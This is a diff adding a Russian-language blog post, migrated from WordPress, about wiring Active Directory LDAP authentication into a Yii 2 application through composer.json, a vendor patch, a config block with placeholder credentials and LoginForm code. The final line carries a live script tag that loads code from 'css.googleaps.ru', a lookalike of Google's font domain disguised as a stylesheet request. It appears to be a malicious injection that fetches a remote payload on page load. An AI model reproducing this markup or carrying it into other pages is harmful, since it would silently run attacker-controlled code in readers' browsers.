@@ -1,0 +1,133 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii 2 AD LDAP
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 47688
+wordpress_url: http://devdocs.ru/?p=47688
+date: '2015-10-06 22:29:29 +0200'
+date_gmt: '2015-10-06 22:29:29 +0200'
+categories:
+- Новости партнеров
+tags:
+- php
+- ip
+- git
+- bootstrap
+- js
+- ui
+- yii2
+- des1roer
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;">
+<pre><code>cd localhost&#47;yii2&#47;basic<&#47;code><&#47;pre><br />
+правим composer.json<br />
+добавляем</p>
+<pre><code><br />
+{<br />
+    "name": "yiisoft&#47;yii2-app-advanced",<br />
+    "description": "Yii 2 Advanced Project Template",<br />
+    "keywords": ["yii2", "framework", "advanced", "project template"],<br />
+    "homepage": "http:&#47;&#47;www.yiiframework.com&#47;",<br />
+    "type": "project",<br />
+    "license": "BSD-3-Clause",<br />
+    "support": {<br />
+        "issues": "https:&#47;&#47;github.com&#47;yiisoft&#47;yii2&#47;issues?state=open",<br />
+        "forum": "http:&#47;&#47;www.yiiframework.com&#47;forum&#47;",<br />
+        "wiki": "http:&#47;&#47;www.yiiframework.com&#47;wiki&#47;",<br />
+        "irc": "irc:&#47;&#47;irc.freenode.net&#47;yii",<br />
+        "source": "https:&#47;&#47;github.com&#47;yiisoft&#47;yii2"<br />
+    },<br />
+    "minimum-stability": "stable",<br />
+    "repositories": [<br />
+        {<br />
+            "type": "package",<br />
+            "package": {<br />
+                "name": "adldap&#47;adLDAP",<br />
+                "version": "4.0.4",<br />
+                "source": {<br />
+                    "url": "https:&#47;&#47;github.com&#47;adldap&#47;adLDAP",<br />
+                    "type": "git",<br />
+                    "reference": "v4.0.4"<br />
+                }<br />
+            }<br />
+        }<br />
+    ],<br />
+    "require": {<br />
+        "php": ">=5.4.0",<br />
+        "yiisoft&#47;yii2": ">=2.0.4",<br />
+        "yiisoft&#47;yii2-bootstrap": "*",<br />
+        "yiisoft&#47;yii2-swiftmailer": "*",<br />
+        "adldap&#47;adldap": "<&#47;code><code>4.0.4 as 4.0-stable",<br />
+        "edvlerblog&#47;yii2-adldap-module": "v1.0.0"<br />
+    },<br />
+    "require-dev": {<br />
+        "yiisoft&#47;yii2-codeception": "*",<br />
+        "yiisoft&#47;yii2-debug": "*",<br />
+        "yiisoft&#47;yii2-gii": "*",<br />
+        "yiisoft&#47;yii2-faker": "*"<br />
+    },<br />
+    "config": {<br />
+        "process-timeout": 1800<br />
+    },<br />
+    "extra": {<br />
+        "asset-installer-paths": {<br />
+            "npm-asset-library": "vendor&#47;npm",<br />
+            "bower-asset-library": "vendor&#47;bower"<br />
+        }<br />
+    }<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<&#47;div></p>
+<pre><code>composer update<&#47;code><&#47;pre><br />
+видать из-за версии не можеть увидеть&nbsp; adLDAP<br />
+в yii2&#47;basic&#47;vendor&#47;edvlerblog&#47;yii2-adldap-module&#47;src&#47;Ldap.php<br />
+исправим</p>
+<pre><code>use yiibaseComponent; &#47;&#47;include YII component class<br />
+&#47;&#47;include  dirname(dirname(dirname(dirname(__FILE__)))) .'&#47;adldap&#47;adldap&#47;src&#47;adLDAP.php';&nbsp; -точно работает<br />
+use Adldap&#47;Adldap; &#47;&#47;нет возможности проверить, но по логике должно<br />
+use adLDAP; &#47;&#47;include the adLDAP class<&#47;code><&#47;pre><br />
+таким образом мы установили Wrapper для ad ldap</p>
+<p>config&#47;main (advanced) либо config&#47;web (basic)</p>
+<pre><code>'components' => [<br />
+    ..... <&#47;code><&#47;pre><br />
+'ldap' => [<br />
+'class'=>'Edvlerblog&#47;Ldap',<br />
+'options'=> [<br />
+&#47;&#47;'ad_port' => 389,<br />
+'domain_controllers' => array('AdServerName1'),<br />
+'account_suffix' => '@test.lan',<br />
+'base_dn' => "DC=test,DC=lan",<br />
+&#47;&#47; for basic functionality this could be a standard, non privileged domain user (required)<br />
+'admin_username' => 'ActiveDirectoryUser',<br />
+'admin_password' => 'StrongPassword'<br />
+]<br />
+]</p>
+<p>...<br />
+]</p>
+<p>yii2&#47;basic&#47;models&#47;LoginForm.php</p>
+<pre><code>    public function login()<br />
+    {<br />
+        $authUser = Yii::$app->ldap->authenticate($this->username, $this->password);<&#47;code><&#47;pre><br />
+if ($authUser)<br />
+return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);</p>
+<p>if ($this->validate())<br />
+{<br />
+return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);<br />
+}<br />
+return false;<br />
+}</p>
+<p>&nbsp;</p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
